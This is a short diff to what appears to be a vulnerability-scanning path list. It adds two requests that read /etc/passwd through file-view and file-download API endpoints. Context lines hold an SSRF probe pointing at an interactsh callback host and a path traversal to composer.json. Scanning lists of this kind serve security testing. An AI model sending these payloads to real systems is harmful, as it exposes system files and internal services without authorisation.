@@ -46,3 +46,5 @@
 
 /wp-admin/admin-ajax.php?action=formcraft3_get&URL=https://{{interactsh-url}}
 /cache/original/%2e%2e/composer.json
+/api/system/fileView?file=/etc/passwd
+/api/system/fileDownload?file=/etc/passwd
